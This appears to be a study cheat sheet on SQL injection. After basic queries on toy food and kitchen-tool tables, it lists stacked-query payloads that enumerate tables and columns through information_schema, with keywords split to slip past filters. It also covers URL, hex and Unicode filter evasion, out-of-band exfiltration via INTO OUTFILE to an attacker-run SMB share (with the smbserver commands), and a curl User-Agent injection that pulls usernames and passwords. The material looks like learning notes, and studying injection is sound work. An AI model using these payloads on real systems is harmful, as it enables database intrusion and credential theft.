**Commands**

SHOW TABLES;
| FOOD      |            |        | KITCHEN TOOLS |             |        |
|:----------|:----------:|-------:|:--------------|:-----------:|-------:|
| Name      | Type       | Colour | Name          | Tools       | Colour |
|:----------|:----------:|-------:|:--------------|:-----------:|-------:|
| Bread     | Carbs      | Brown  | Knife         | Cutting     | Silver |
| Rice      | Carbs      | White  | Spoon         | Utensil     | Grey   |
| Chicken   | Meat       | White  | Pan           | Cookware    | Black  |
| Beef      | Meat       | Red    | Grill         | Cookware    | Black  |
| Salmon    | Fish       | Pink   | Spatula       | Utensil     | Red    |
| Tuna      | Fish       | Red    | Tongs         | Utensil     | Silver |
| Broccoli  | Vegetable  | Green  | Peeler        | Prep Tool   | Green  |
| Apple     | Fruit      | Red    | Grater        | Prep Tool   | Silver |
| Milk      | Dairy      | White  | Whisk         | Utensil     | Metal  |

-  __View all data__  -  SELECT * FROM FOOD;
-  __Select specific columns__  -  SELECT NAME, TYPE FROM FOOD;
-  __Update a row__  -  UPDATE FOOD SET COLOUR = 'Light Brown' WHERE NAME = 'Bread';
-  __Filter by type__  -  SELECT * FROM FOOD WHERE TYPE = 'Meat';
-  __Delete a row__  -  DELETE FROM FOOD WHERE NAME = 'Tuna';

**SQL INJECTION TO GRAB INFOMATION FROM ANOTHER TABLE.**


**GET TABLES**
-  1;UPDATE FOOD SET Name=concat((SSELECTELECT group_concat(table_name)FROM infoorrmation_schema.tables WHERE table_schema=database()));

**GET COLUMN NAMES**
-  1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(column_name) FROM infoorrmation_schema.columns WHERE table_name='KITCHEN TOOLS'));

**GET ROW DATA**
-  1;UPDATE FOOD SET country=concat((SSELECTELECT group_concat(Name, Tools) FROM KITCHEN TOOLS));


(*) -> wildcard selector (all fields / columns)
(;) -> statement terminator


**Notes**
Updating a bictim query input:random;UPDATE FOOD SET COLOUR = 'Light Brown' WHERE NAME = 'Bread';
Anything after -- on the same line is ignored by the database.

```https://gchq.github.io/CyberChef/``` to encode URLS

Common/Default SQL database ports
*  MySQL / MariaDB 3306
*  PostgreSQL 5432
*  Microsoft SQL Server (MSSQL) 1433 or 1434
*  Oracle Database 1521

SQL tools
*  SQLMAP
*  SQLNINJA
*  JSQL INJECTION
*  BBQSQL


## Filter Evasion Techniques

*  **URL Encoding** - Common encoding method where characters are represetned using **%** followed by their ASCII value. ```' OR 1=1--``` -> ```%27%20OR%201%3D1--```

*  **Hexadecimal Encoding** - ```SELECT * FROM users WHERE name = 'admin'``` -> ```SELECT * FROM users WHERE name = 0x61646d696e```  

*  **Unicode Encoding** -  ```admin``` -> ```\u0061\u0064\u006d\u0069\u006e``` Bypass filters that only check for specific ASCII characters.


## Out of band injection
Sends SQL messages to a external source, for a example a python server.

Internal:
*  ```SELECT sensitive_data INTO OUTFILE '\\\\[IP ADDRESS]\\logs\\out.txt';```

External:
*  ```python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp```
*  ```smbclient //[IP ADDRESS]/logs -U guest -N``` -> access the contents of the network share

## HTTP Header Injection
If SQL queries are on the server side and are not sanitised it may lead to SQL onto HTTP headers such as **User-Agent, Referer, or X-Forwarded-For**

```curl -H "User-Agent: ' UNION SELECT username, password FROM user; # "http://WEBSITE.COM```
